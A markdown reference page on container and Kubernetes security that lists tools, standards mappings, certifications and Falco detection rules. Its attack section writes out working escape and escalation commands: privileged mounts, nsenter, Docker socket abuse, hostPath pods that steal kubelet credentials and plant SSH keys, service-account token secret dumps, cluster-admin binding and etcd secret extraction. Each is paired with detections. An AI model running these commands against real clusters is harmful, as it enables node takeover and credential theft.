# Container & Kubernetes Security

Container and Kubernetes security encompasses the practices, tools, and controls required to secure containerized workloads throughout their full lifecycle — from image build through registry storage, deployment, and runtime execution. The discipline has matured rapidly alongside the adoption of Kubernetes as the dominant container orchestration platform, and it now covers a distinct and deep attack surface: vulnerable base images, misconfigured orchestration layers, container runtime escapes, insecure pod configurations, secrets embedded in manifests, and supply chain risks in public container registries.

The fundamental challenge of container security is that containers share a kernel with the host. An improperly configured container running as root with unnecessary Linux capabilities is not an isolated workload — it is a privilege escalation path to the underlying node and, from there, to the rest of the cluster. Kubernetes amplifies this: a single misconfigured RBAC binding, an exposed API server, or an unencrypted etcd store can compromise an entire production environment. Container and Kubernetes security is the discipline of systematically reducing this attack surface at every layer of the stack.

---

## Where to Start

Begin with the fundamentals of how containers actually work — namespaces, cgroups, and the Linux capabilities model — before studying Kubernetes security. Understanding why `--privileged` containers are dangerous, what `CAP_NET_ADMIN` actually grants, and how the container runtime mediates host access makes every other Kubernetes security concept more concrete. The CKA certification provides the necessary Kubernetes operations foundation before pursuing the CKS.

| Stage | Focus | Where to Begin |
|---|---|---|
| Foundation | Container fundamentals (namespaces, cgroups, capabilities), image scanning basics, Dockerfile best practices, Kubernetes architecture and RBAC basics, pod security standards | Docker security documentation, kube-bench CIS benchmark runs, Trivy image scanning quickstart, CNCF Kubernetes Security Whitepaper |
| Practitioner | Kubernetes RBAC hardening, network policies, admission controllers (OPA Gatekeeper, Kyverno), image signing with Cosign, Falco runtime detection, secrets management with Vault | KubeCon security talks (free on YouTube), NSA/CISA Kubernetes Hardening Guide, CKA certification, killer.sh CKS practice environment |
| Advanced | eBPF-based runtime security (Tetragon), service mesh mTLS (Istio), SLSA for container builds, container escape research, multi-tenant cluster hardening, supply chain attestation | CKS certification, CNCF Security Technical Advisory Group papers, Liz Rice "Container Security" (O'Reilly), eBPF Summit talks |

---

## Free Training

- [NSA/CISA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF) — The authoritative US government hardening reference for Kubernetes; covers pod security, network policies, authentication, logging, and threat detection; free and kept current; the first document to read before hardening any cluster
- [CNCF Cloud Native Security Whitepaper](https://github.com/cncf/tag-security/blob/main/security-whitepaper/v2/CNCF_cloud-native-security-whitepaper-May2022-v2.pdf) — Comprehensive cloud-native security architecture guidance from the CNCF Security Technical Advisory Group; covers the full lifecycle from development through runtime; authoritative and vendor-neutral
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes) — Free hardening baseline covering API server, etcd, kubelet, scheduler, and worker node configuration; the compliance standard most enterprise Kubernetes programs anchor to; run kube-bench to audit against it
- [Kubernetes Security Documentation](https://kubernetes.io/docs/concepts/security/) — Official Kubernetes security docs covering RBAC, network policies, pod security standards, secrets encryption, and admission control; required reading for the CKS exam
- [KubeCon Security Talks (CNCF YouTube)](https://www.youtube.com/@cncf) — Free recordings from every KubeCon conference covering container escape research, supply chain security, eBPF security, and Kubernetes hardening; the highest-signal free content in the discipline
- [Falco Documentation and Labs](https://falco.org/docs/) — Free getting-started labs for deploying Falco, writing detection rules, and integrating with SIEM; the best way to understand container runtime threat detection hands-on
- [Aqua Cloud Native Academy](https://www.aquasec.com/cloud-native-academy/) — Free cloud-native security learning content covering container security, Kubernetes hardening, and supply chain security; practitioner-level and consistently updated
- [Killer.sh CKS Preview](https://killer.sh) — Free preview scenarios for the CKS exam environment; the most realistic preparation available for the Certified Kubernetes Security Specialist exam

---

## Tools & Repositories

### Image Scanning
- [aquasecurity/trivy](https://github.com/aquasecurity/trivy) — The most widely deployed open-source container vulnerability scanner; image scanning, Kubernetes misconfiguration detection, SBOM generation, and secrets detection in a single tool; the de facto standard for CI/CD pipeline scanning
- [anchore/grype](https://github.com/anchore/grype) — Fast vulnerability scanner for container images and filesystems using the Anchore vulnerability database; pairs with Syft for SBOM-based scanning workflows
- [quay/clair](https://github.com/quay/clair) — Open-source container vulnerability analysis from Red Hat; designed for integration with container registries to scan images at push time
- [docker/scout-cli](https://github.com/docker/scout-cli) — Docker's official image analysis CLI; vulnerability scanning, base image recommendations, and supply chain policy checks integrated into Docker Desktop and Docker Hub

### Runtime Security
- [falcosecurity/falco](https://github.com/falcosecurity/falco) — The CNCF standard for container and Kubernetes runtime security; uses eBPF or kernel module to detect unexpected process execution, network connections, file access, and syscall anomalies at container and host level; the most deployed open-source runtime security tool
- [cilium/tetragon](https://github.com/cilium/tetragon) — eBPF-based security observability and enforcement from the Cilium project; syscall-level runtime security with policy enforcement and forensic-grade event capture; lower overhead than Falco for high-throughput workloads
- [google/gvisor](https://github.com/google/gvisor) — Application kernel written in Go that provides a sandboxed container runtime; intercepts container syscalls with a user-space kernel to reduce the host kernel attack surface
- [kata-containers/kata-containers](https://github.com/kata-containers/kata-containers) — Lightweight virtual machines that behave like containers; hardware virtualization boundary between container workloads and the host kernel; the strongest container isolation available

### Policy Enforcement & Admission Control
- [open-policy-agent/gatekeeper](https://github.com/open-policy-agent/gatekeeper) — Kubernetes admission controller using OPA (Open Policy Agent) for policy-as-code enforcement; blocks non-compliant workloads at admission time; the most widely deployed Kubernetes policy engine
- [kyverno/kyverno](https://github.com/kyverno/kyverno) — Kubernetes-native policy engine using YAML-based policies without requiring Rego; validates, mutates, and generates resources at admission time; lower learning curve than OPA Gatekeeper
- [kubewarden/kubewarden-controller](https://github.com/kubewarden/kubewarden-controller) — WebAssembly-based Kubernetes admission controller; policies compiled to Wasm modules for performance and language flexibility

### Image Signing & Supply Chain
- [sigstore/cosign](https://github.com/sigstore/cosign) — The Sigstore tool for signing and verifying container images and other OCI artifacts; keyless OIDC-based signing using Fulcio and Rekor; the emerging standard for container image integrity
- [notaryproject/notation](https://github.com/notaryproject/notation) — Notary v2 CLI for signing and verifying OCI artifacts; CNCF project with broad registry and toolchain support; alternative to Cosign for enterprise signing workflows

### Networking
- [cilium/cilium](https://github.com/cilium/cilium) — eBPF-based Kubernetes networking and security; transparent encryption, network policy enforcement at the kernel level, and deep visibility into pod-to-pod traffic; the most capable open-source CNI for security-conscious deployments
- [projectcalico/calico](https://github.com/projectcalico/calico) — The most widely deployed Kubernetes CNI for NetworkPolicy enforcement; global network policies, egress controls, and Kubernetes NetworkPolicy compatibility
- [istio/istio](https://github.com/istio/istio) — The most deployed service mesh; mutual TLS between all pods, L7 traffic policy, and authorization policies; eliminates unencrypted east-west traffic in Kubernetes clusters

### Secrets Management
- [hashicorp/vault](https://github.com/hashicorp/vault) — The standard open-source secrets management platform; dynamic secrets, PKI, Kubernetes auth integration, and encryption as a service; removes the need to store static secrets in Kubernetes Secrets objects
- [external-secrets/external-secrets](https://github.com/external-secrets/external-secrets) — Kubernetes operator that syncs secrets from external providers (AWS Secrets Manager, GCP Secret Manager, HashiCorp Vault) into Kubernetes Secrets; decouples secrets from cluster state
- [bitnami-labs/sealed-secrets](https://github.com/bitnami-labs/sealed-secrets) — Encrypts Kubernetes Secrets for safe storage in version control; the SealedSecret CRD is decrypted only by the in-cluster controller; practical GitOps-compatible secrets solution

### Kubernetes Security Assessment
- [aquasecurity/kube-bench](https://github.com/aquasecurity/kube-bench) — CIS Kubernetes Benchmark compliance checker; audits API server, etcd, kubelet, and scheduler configuration against CIS controls; the standard tool for Kubernetes hardening assessment
- [aquasecurity/kube-hunter](https://github.com/aquasecurity/kube-hunter) — Active Kubernetes penetration testing; discovers vulnerabilities and misconfigurations from an attacker perspective including API server exposure and RBAC weaknesses
- [cyberark/KubiScan](https://github.com/cyberark/KubiScan) — Scans Kubernetes clusters for risky RBAC permissions and overprivileged roles; identifies which service accounts can escalate privileges or access sensitive resources
- [Shopify/kubeaudit](https://github.com/Shopify/kubeaudit) — Audits Kubernetes clusters and manifests against security best practices; checks for privileged containers, missing network policies, and insecure capabilities
- [corneliusweig/rakkess](https://github.com/corneliusweig/rakkess) — Displays the RBAC access matrix for Kubernetes resources; shows exactly which permissions every subject has across all API groups; essential for RBAC audit
- [alcideio/rbac-tool](https://github.com/alcideio/rbac-tool) — RBAC visualization and policy generation for Kubernetes; generates network policies and summarizes permissions across subjects and resources

---

## Commercial & Enterprise Platforms

| Platform | Strength |
|---|---|
| **Prisma Cloud (Palo Alto Networks)** | Full CNAPP coverage from image scanning through runtime; Kubernetes admission control, CI/CD pipeline scanning, and compliance reporting; deepest container security feature set among legacy security vendors |
| **Wiz** | Agentless container and Kubernetes security with Security Graph connecting image vulnerabilities, Kubernetes misconfigs, network exposure, and identity risk into exploitable attack paths; fastest deployment with broadest cloud provider coverage |
| **Aqua Security** | The container-native security specialist; Aqua Platform adds enterprise runtime protection, network policy enforcement, image assurance policies, and compliance reporting built on the Trivy open-source engine |
| **Sysdig Secure** | Container and Kubernetes runtime security and compliance built on Falco; commercial threat intelligence, managed Falco rules, and compliance dashboards; the commercial offering for organizations wanting enterprise Falco support |
| **Lacework** | Behavioral anomaly detection for container workloads; unsupervised ML identifies deviations from normal container behavior without requiring rule authoring; acquired by Fortinet |
| **Snyk Container** | Developer-first container image scanning with base image recommendations and auto-remediation PRs; strong IDE and CI/CD integration for shift-left container security |
| **NeuVector (SUSE)** | Open-source and enterprise container security platform with zero-trust network segmentation, deep packet inspection, and runtime vulnerability patching; the most capable open-core option for on-premises deployments |

---

## NIST 800-53 Control Alignment

| Control | ID | Container & Kubernetes Relevance |
|---|---|---|
| Least Functionality | CM-7 | Non-root containers, read-only root filesystems, dropped Linux capabilities, and minimal base images directly implement least functionality for container workloads |
| Configuration Settings | CM-6 | Pod Security Standards (restricted/baseline/privileged), admission controller policies, and Kubernetes API server hardening settings operationalize configuration management |
| Security Function Isolation | SC-3 | Namespace isolation, gVisor and Kata Containers sandboxing, and seccomp/AppArmor profiles provide security function isolation between container workloads |
| Process Isolation | SC-39 | Linux namespaces (PID, mount, network, user) provide process isolation between containers; gVisor adds a second isolation boundary via a user-space kernel |
| Access Enforcement | AC-3 | Kubernetes RBAC enforces access control for API server operations; NetworkPolicy enforces network access control; OPA Gatekeeper enforces admission-time policy |
| Malware Protection | SI-3 | Falco and Tetragon runtime detection identify malicious process execution, unexpected network connections, and file system tampering in container workloads |
| Vulnerability Scanning | RA-5 | Trivy, Grype, and Clair scan container images for known CVEs at build time and registry push time; continuous scanning catches new CVEs in deployed images |
| Developer Configuration Management | SA-10 | Image signing with Cosign and Notary v2, SLSA build provenance, and immutable container registries implement supply chain integrity controls |

---

## ATT&CK Coverage

| Technique | ID | Container Security Control |
|---|---|---|
| Deploy Container | T1610 | Admission controllers (OPA Gatekeeper, Kyverno) enforce image allowlists, registry policies, and deployment constraints; only signed and scanned images from approved registries reach production |
| Escape to Host | T1611 | Pod Security Standards (restricted profile), seccomp profiles, AppArmor, dropped capabilities, non-root enforcement, and gVisor/Kata sandboxing reduce container escape risk |
| Container and Resource Discovery | T1613 | RBAC least privilege limits which service accounts can enumerate pods, services, and config maps; NetworkPolicy restricts lateral movement for recon within the cluster |
| Credentials in Container | T1552.007 | Secrets management (Vault, External Secrets Operator) eliminates static credentials in environment variables and Kubernetes Secrets; image scanning detects hardcoded secrets in layers |
| Disable Security Tools | T1562.001 | Falco and Tetragon runtime detection alert on attempts to kill monitoring agents or modify audit configurations; immutable container filesystems prevent tampering |
| Resource Hijacking | T1496 | Runtime anomaly detection identifies cryptomining workloads via unexpected CPU spikes, network connections to mining pools, and execution of known mining binaries |
| Modify Cloud Compute Infrastructure | T1578 | RBAC controls restrict which identities can modify cluster infrastructure; admission controllers prevent deployment of privileged workloads that could affect node configuration |
| Exploit Public-Facing Application | T1190 | Image vulnerability scanning prevents deployment of images with known exploitable CVEs; Kubernetes API server hardening (authentication, authorization, audit logging) protects the control plane |

---

## Attacking Container Environments

Understanding how attackers compromise container environments is essential for building effective defenses. The techniques below represent the most common and impactful attack paths observed in real-world incidents and penetration tests. Each technique is explained at the mechanism level — knowing *why* it works helps you understand what controls actually prevent it.

### Container Escape Techniques

A container escape is any technique that allows a process running inside a container to gain access to the host OS or other containers on the same node. Containers are not a security boundary by default — they are a process isolation mechanism. The Linux kernel is shared, and most escape techniques exploit the gap between "isolation" and "true isolation."

**Privileged Container Escape**

When a container is launched with `--privileged` (or `securityContext.privileged: true` in Kubernetes), the container receives nearly all Linux capabilities and direct access to host devices. The kernel no longer enforces namespace isolation for device access. This is one of the most common misconfigurations found in CI/CD pipelines, monitoring agents, and developer convenience deployments.

```bash
# Attacker is inside a privileged container.
# List host block devices — visible because --privileged removes device namespace restrictions.
ls /dev/sd*

# Mount the host root filesystem into /mnt inside the container.
# Works because CAP_SYS_ADMIN (granted by --privileged) allows arbitrary mounts,
# and the container sees host block devices directly through the device namespace.
mount /dev/sda1 /mnt

# Chroot into the mounted host filesystem for full host access.
# The container boundary is gone — the attacker now operates as root on the host OS.
chroot /mnt /bin/bash
```

*Why it works:* `--privileged` disables most kernel namespace enforcement and grants the full Linux capability set. Capabilities like `CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, and `CAP_SYS_PTRACE` each independently enable powerful escape primitives. The privileged flag is conceptually equivalent to giving the container root on the host.

*Detection:* Falco rule `container_privileged` fires when any container starts with `privileged: true`. kube-bench check 5.2.1 flags pods using privileged mode. Tetragon detects `mount` syscalls issued from container context.

---

**nsenter — Joining Host Namespaces**

Linux namespaces are the kernel feature that makes containers feel isolated: each container gets its own PID, network, mount, and UTS namespace. The `nsenter` tool joins an *existing* namespace by referencing another process's `/proc/<pid>/ns/*` file descriptors. Running `nsenter --target 1` from inside a container requests entry into PID 1's namespaces — which belong to the host init process, outside all container isolation.

```bash
# nsenter --target 1 joins the namespaces of PID 1 (the host init / systemd process).
# --mount  joins the host mount namespace (sees all host filesystems and block devices)
# --uts    joins the host UTS namespace (hostname becomes the node hostname)
# --ipc    joins the host IPC namespace (host shared memory, semaphore sets)
# --net    joins the host network namespace (sees all host interfaces and routing)
# --pid    joins the host PID namespace (can see, signal, and ptrace host processes)
#
# Requires CAP_SYS_PTRACE or CAP_SYS_ADMIN and visibility to host PID 1 namespace.
# Both conditions are satisfied in --privileged containers and pods with hostPID: true.
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

*Why it works:* Namespace access is gated only by a capability check. Any process with the right capabilities can legally ask the kernel to switch into any namespace it can reference via a `/proc/<pid>/ns/` file descriptor. There is no membership requirement — only a capability check.

*Detection:* Falco's `nsenter_container_escape` rule detects `nsenter` execution from container context. Tetragon can enforce a kernel-level policy blocking `setns` syscalls (the underlying call `nsenter` uses) from any container context.

---

**Docker Socket Abuse**

The Docker daemon socket at `/var/run/docker.sock` is the Unix socket through which the Docker CLI communicates with the Docker daemon (which runs as root on the host). Mounting this socket into a container gives that container root on the host: any process inside the container can issue Docker API commands that the daemon executes with root privileges, including creating new privileged containers that mount the host filesystem.

This misconfiguration is extremely common in CI/CD environments: Jenkins agents, GitLab Runners configured for Docker-in-Docker, and certain monitoring tools frequently mount the Docker socket.

```bash
# Confirm the Docker socket is accessible inside the container.
ls -la /var/run/docker.sock

# Use the Docker CLI to launch a new privileged container that mounts the host root.
# The Docker daemon — running as root — creates this container on behalf of the attacker.
# No kernel exploit required: we are instructing the privileged daemon to comply.
docker run -v /:/hostfs --rm -it ubuntu:latest chroot /hostfs /bin/bash

# Alternative: use the raw Docker REST API via curl (no Docker CLI binary needed).
# Step 1: Create the container.
curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Binds":["/:/hostfs"],"Privileged":true}}'

# Step 2: Start the container using the ID from the Step 1 response.
curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/<CONTAINER_ID>/start"
```

*Why it works:* The Docker daemon is a privileged root process. Its socket has no authentication beyond Unix filesystem permissions. Anyone who can write to the socket can instruct the daemon to perform any operation — including creating new privileged containers with host filesystem mounts.

*Detection:* Falco detects reads and writes to `/var/run/docker.sock` from container processes. OPA Gatekeeper and Kyverno policies block pods declaring `/var/run/docker.sock` as a `hostPath` volume. Any admission webhook should reject pod specs mounting the Docker socket path.

---

**hostPath Volume Abuse**

Kubernetes `hostPath` volumes mount a path from the node filesystem directly into a pod. An attacker who can create or modify pod specs can use `hostPath` to read sensitive node files (kubelet credentials, PKI keys, `/etc/shadow`) or write files that execute on the host (cron jobs, SSH `authorized_keys`, systemd unit files).

```yaml
# Malicious pod spec requesting the entire host root filesystem via hostPath.
# Without an admission controller blocking unrestricted hostPath mounts,
# this pod provides read/write access to the complete node filesystem.
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-escape
spec:
  containers:
  - name: attacker
    image: ubuntu:latest
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - mountPath: /hostfs      # container-side mount point for the host filesystem
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /                  # entire host filesystem exposed to the container
      type: Directory
```

```bash
# Read the node kubelet kubeconfig — contains TLS client credentials the kubelet
# uses to authenticate to the API server; stealing these allows impersonating the node.
kubectl exec hostpath-escape -- cat /hostfs/etc/kubernetes/kubelet.conf

# Write an SSH public key to root authorized_keys on the node for persistent access.
kubectl exec hostpath-escape -- \
  sh -c 'mkdir -p /hostfs/root/.ssh && echo "ssh-rsa AAAA..." >> /hostfs/root/.ssh/authorized_keys'
```

*Why it works:* The kubelet mounts the declared hostPath volume with no kernel namespace preventing the container from accessing host files at that mount point. The pod runs as root by default unless explicitly prevented, giving read/write access to any node file reachable from the container.

*Detection:* OPA Gatekeeper `K8sPSPHostFilesystem` policy blocks unrestricted hostPath mounts. kube-bench 5.2.7 flags pods using hostPath volumes. Falco rule `read_sensitive_file_trusted_after_startup` catches sensitive file access from container context. The [BadPods](https://github.com/BishopFox/badpods) project provides nine pod specs for testing each dangerous permission class.

---

**Kernel Exploit Container Escapes**

Because containers share the host kernel, any kernel vulnerability exploitable from an unprivileged user namespace can break container isolation completely. Historical examples with high real-world impact:

| CVE | Name | Kernel Range | Mechanism |
|---|---|---|---|
| CVE-2016-5195 | Dirty COW | < 4.8.3 | Race condition in copy-on-write; SUID binary overwrite achievable from container |
| CVE-2019-5736 | runc overwrite | runc < 1.0-rc6 | Container process overwrites the host runc binary during exec; achieves host root on next container operation |
| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16.11 | Pipe splice flaw; overwrite arbitrary read-only file pages including SUID binaries in host kernel page cache |
| CVE-2022-23648 | containerd path traversal | containerd < 1.4.13 | Spec parsing flaw; read arbitrary host files via specially crafted container image |

*Why it works:* Kernel exploits operate below the namespace and capability model. They corrupt kernel data structures or exploit race conditions in kernel code directly. Container isolation is irrelevant once an attacker achieves kernel code execution or can overwrite kernel-mapped pages.

*Detection:* The primary mitigation is keeping node OS kernels patched. gVisor and Kata Containers provide the strongest defense: kernel exploits from inside a gVisor container target the Go-implemented gVisor kernel, not the host kernel. Seccomp profiles reduce the available syscall attack surface. kube-bench 4.2.6 checks that the kubelet uses a current and secure OS image.

---

### Kubernetes Cluster Compromise

Beyond escaping individual containers, attackers who gain any foothold pursue lateral movement and privilege escalation at the orchestration layer.

**Unauthenticated API Server Access**

The Kubernetes API server is the cluster control plane — every operation passes through it. Clusters misconfigured with `--anonymous-auth=true` and permissive RBAC for `system:anonymous` can allow full unauthenticated cluster control.

```bash
# Probe the API server for unauthenticated access.
# A response containing pod listings without credentials means full compromise.
curl -sk https://<API_SERVER_IP>:6443/api/v1/pods

# kube-hunter performs automated active discovery of this and related misconfigurations.
kube-hunter --remote <API_SERVER_IP>

# If anonymous access is confirmed, enumerate the full cluster state.
kubectl --server https://<API_SERVER_IP>:6443 --insecure-skip-tls-verify \
  get pods,secrets,configmaps --all-namespaces
```

*Detection:* kube-bench 1.2.1 checks `--anonymous-auth=false`. kube-bench 1.2.6 checks `--authorization-mode` includes `Node,RBAC`. Kubernetes audit logs record every API server request including source IP and user identity — anonymous requests are immediately identifiable.

---

**Service Account Token Abuse**

Every pod is automatically mounted with a service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. This JWT authenticates to the API server. If the service account has overly broad RBAC permissions, any attacker who compromises a pod in that namespace inherits those permissions.

```bash
# Extract the mounted SA token and CA cert — present in every pod by default
# unless automountServiceAccountToken is explicitly disabled.
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# If the SA can list secrets, this dumps all secrets in the namespace —
# including other SA tokens, TLS certificates, database passwords, and API keys.
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/secrets

# Enumerate the RBAC permissions the current SA actually holds.
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -X POST $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets","namespace":"default"}}}'
```

*Detection:* Disable automatic token mounting where not needed (`automountServiceAccountToken: false`). Apply RBAC least privilege — service accounts should have only the specific permissions the workload requires. Falco detects unexpected reads of the SA token by non-application processes. KubiScan identifies overprivileged service accounts cluster-wide.

---

**RBAC Privilege Escalation**

Any RBAC permission that allows creating or modifying cluster resources can be leveraged to gain higher permissions, because Kubernetes resources are the mechanism through which code execution happens.

```bash
# Path 1: ClusterRoleBinding creation -> cluster-admin
# If the compromised identity can create clusterrolebindings,
# it can grant cluster-admin to any subject it controls.
kubectl create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=default:compromised-sa

# Path 2: Pod creation with hostPath -> node root
# create pods permission allows deploying a hostPath pod (see above) for node escape.

# Path 3: Pod exec -> code execution in running containers
# pods/exec allows running arbitrary commands in any permitted pod, including
# privileged pods in kube-system with host access.
kubectl exec -n kube-system <privileged-pod-name> -- /bin/bash

# Enumerate the current identity's full RBAC permissions.
kubectl auth can-i --list
kubectl auth can-i --list --as=system:serviceaccount:default:target-sa

# rakkess generates a complete permission matrix across all API resources and verbs.
kubectl rakkess
```

*Detection:* KubiScan continuously scans for RBAC configurations that permit privilege escalation. Kubernetes audit logs capture all RBAC-mutating API calls. Falco detects `ClusterRoleBinding` creation events. The `rbac-tool` visualizes permission graphs to surface escalation paths.

---

**etcd Access — Direct Credential Extraction**

etcd is the key-value store backing all Kubernetes cluster state. An attacker with direct etcd network access bypasses RBAC entirely — the authorization layer applies only to the API server, not to direct etcd access. Before Kubernetes 1.13, Secrets were stored as base64-encoded plaintext.

```bash
# If etcd lacks mutual TLS client authentication, dump the entire cluster state.
ETCDCTL_API=3 etcdctl \
  --endpoints=https://<ETCD_IP>:2379 \
  --insecure-skip-tls-verify \
  get / --prefix --keys-only

# Extract all Kubernetes Secrets directly from etcd, bypassing RBAC entirely.
# Pre-1.13: base64 only. Post-1.13 with EncryptionConfiguration: AES-encrypted,
# but the encryption key itself must also be secured.
ETCDCTL_API=3 etcdctl \
  --endpoints=https://<ETCD_IP>:2379 \
  --insecure-skip-tls-verify \
  get /registry/secrets --prefix | strings
```

*Detection:* kube-bench 2.1 checks etcd requires TLS client certificate authentication. kube-bench 1.2.34 checks secrets are encrypted at rest via `EncryptionConfiguration`. Network segmentation is the primary mitigation: etcd port 2379 should be reachable only from control plane nodes.

---

### Common Attack Tools

| Tool | Purpose | Key Use Case |
|---|---|---|
| [kube-hunter](https://github.com/aquasecurity/kube-hunter) | Kubernetes attack surface discovery | Scans from inside or outside a cluster for exposed API servers, anonymous access, open ports, and RBAC weaknesses; generates a prioritized finding report |
| [CDK (Container DucK)](https://github.com/cdk-team/CDK) | Container exploitation toolkit | Post-exploitation from inside containers; auto-detects escape paths, Docker socket, SA token, cloud metadata SSRF, and deploys reverse shells |
| [BadPods](https://github.com/BishopFox/badpods) | Reference pod specs for dangerous permissions | Nine pod manifests each testing one dangerous permission class (hostPID, hostNetwork, hostPath /, privileged, etc.); validates admission controller coverage |
| [Peirates](https://github.com/inguardians/peirates) | Kubernetes post-exploitation | SA token harvesting, RBAC enumeration, secret extraction, pod deployment for node escape; Kubernetes-specific post-exploitation framework |
| [KubiScan](https://github.com/cyberark/KubiScan) | RBAC risk scanning | Identifies risky roles, overprivileged role bindings, and SA escalation paths without requiring active exploitation |
| [etcdctl](https://github.com/etcd-io/etcd) | etcd direct interaction | Dump cluster state when etcd is accessible; verify encryption-at-rest configuration as a defender |

**CDK — Automated Container Escape Triage**

CDK automates detection of which escape techniques are viable in the current container environment — useful for rapidly assessing attack surface after landing in an unknown container.

```bash
# CDK evaluate auto-detects all available escape paths in the current container.
# Checks: privileged mode, Docker socket, hostPath mounts, writable cgroup release_agent,
# kernel version vs. known CVEs, cloud metadata service reachability (AWS/GCP/Azure), and more.
./cdk evaluate

# CDK can also automate exploitation of discovered paths:
./cdk run docker-sock-exploit    # Docker socket escape if socket is present
./cdk run mount-cgroup           # cgroup release_agent escape
```

**Peirates — Kubernetes Post-Exploitation**

```bash
# Peirates provides an interactive post-exploitation menu for Kubernetes.
# It auto-reads the mounted SA token and CA cert, authenticates to the API server,
# and presents attack options based on the permissions the current SA actually holds.
./peirates

# Key capabilities via the interactive menu:
# - List and extract all secrets the SA token can read
# - Deploy pods with hostPath mounts for node escape
# - Enumerate which nodes the SA can schedule workloads to
# - Attempt RBAC escalation via known dangerous permission patterns
# - Harvest SA tokens from all pods in the namespace
```

---

### How Defenders Detect Each Technique

| Attack Technique | Falco Detection | kube-bench Check | Preventive Control |
|---|---|---|---|
| Privileged container launch | `container_privileged` rule | 5.2.1 — Prohibit privileged containers | Gatekeeper `K8sPSPPrivilegedContainer`; Pod Security Standards restricted profile |
| nsenter / setns from container | `nsenter_container_escape` rule | 5.2.2 — Prohibit root containers | Tetragon blocking `setns` syscall from container context; `hostPID: false` in pod spec |
| Docker socket mount | Socket read detection rules | 5.2.7 — Prohibit hostPath | Kyverno/Gatekeeper blocking `/var/run/docker.sock` in hostPath |
| Sensitive hostPath mount | `read_sensitive_file_trusted_after_startup` | 5.2.7 — Prohibit/restrict hostPath | Gatekeeper `K8sPSPHostFilesystem` with explicit safe-path allowlist |
| SA token read by unexpected process | `read_sensitive_file` rule on `/var/run/secrets/` | 5.1.6 — Do not bind default SA to active roles | `automountServiceAccountToken: false`; RBAC least privilege per workload |
| Anonymous API server access | Audit log: `user=system:anonymous` | 1.2.1 — `--anonymous-auth=false` | Network policy blocking external access to API server port 6443 |
| ClusterRoleBinding escalation | Audit log: create/patch on `clusterrolebindings` | 5.1.1 — Restrict cluster-admin | KubiScan continuous monitoring; Gatekeeper blocking wildcard RBAC grants |
| etcd unauthenticated access | N/A (network layer) | 2.1 — etcd TLS client auth; 1.2.34 — secrets encrypted at rest | Network segmentation; etcd port 2379 control-plane-only |
| Cryptomining workload (T1496) | `detect_crypto_miners_using_the_cpu` rule | N/A | Tetragon process execution policy; egress NetworkPolicy blocking mining pool IP ranges |
| Container filesystem write | `write_below_binary_dir` rule | N/A | `readOnlyRootFilesystem: true` in pod securityContext |

**Example Falco Rule: Unexpected Service Account Token Read**

```yaml
- rule: Unexpected Service Account Token Read
  desc: >
    A process other than the expected application binary read the Kubernetes
    service account token. This is a strong indicator of post-exploitation:
    an attacker inside the container is harvesting the SA token to authenticate
    to the Kubernetes API server and enumerate cluster resources or escalate privileges.
  condition: >
    open_read
    and fd.name startswith "/var/run/secrets/kubernetes.io/serviceaccount/token"
    and not proc.name in (expected_app_binaries)
    and container
  output: >
    Unexpected SA token read (user=%user.name command=%proc.cmdline file=%fd.name
    container_id=%container.id image=%container.image.repository:%container.image.tag
    k8s_pod=%k8s.pod.name k8s_ns=%k8s.ns.name)
  priority: WARNING
  tags: [container, kubernetes, credential_access, T1552.007]
```

For high-security environments, Tetragon can enforce this as a kernel-level policy that *blocks* the read rather than only alerting on it.

---

## Certifications

- **CKS** (Certified Kubernetes Security Specialist — CNCF) — The premier Kubernetes security certification; covers cluster hardening, system hardening, minimizing microservice vulnerabilities, supply chain security, monitoring, and runtime security; requires CKA as prerequisite; the most respected credential for Kubernetes security practitioners
- **CKA** (Certified Kubernetes Administrator — CNCF) — The required prerequisite for CKS; validates deep Kubernetes operations knowledge including networking, storage, scheduling, and troubleshooting; foundational for any Kubernetes security role
- **CKAD** (Certified Kubernetes Application Developer — CNCF) — Validates container and Kubernetes application development skills; useful context for security practitioners who need to understand what developers are deploying and why
- **AWS Certified Security — Specialty** — Covers EKS security including IAM roles for service accounts, ECR image scanning, and EKS cluster hardening; the relevant vendor certification for AWS-hosted Kubernetes workloads
- **OSCP** (Offensive Security Certified Professional) — Container escape and Kubernetes privilege escalation techniques appear in modern OSCP exam environments; offensive knowledge directly informs defensive container security controls

---

## Learning Resources

| Resource | Type | Notes |
|---|---|---|
| [NSA/CISA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF) | Free guide | Authoritative US government Kubernetes hardening reference |
| [CNCF Security Whitepaper v2](https://github.com/cncf/tag-security/blob/main/security-whitepaper/v2/CNCF_cloud-native-security-whitepaper-May2022-v2.pdf) | Free paper | Cloud-native security architecture lifecycle reference |
| [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes) | Free benchmark | Hardening baseline; run with kube-bench for CIS compliance |
| [Container Security (Liz Rice, O'Reilly)](https://www.oreilly.com/library/view/container-security/9781492056690/) | Book | The definitive container security reference; namespaces, capabilities, seccomp, and runtime security |
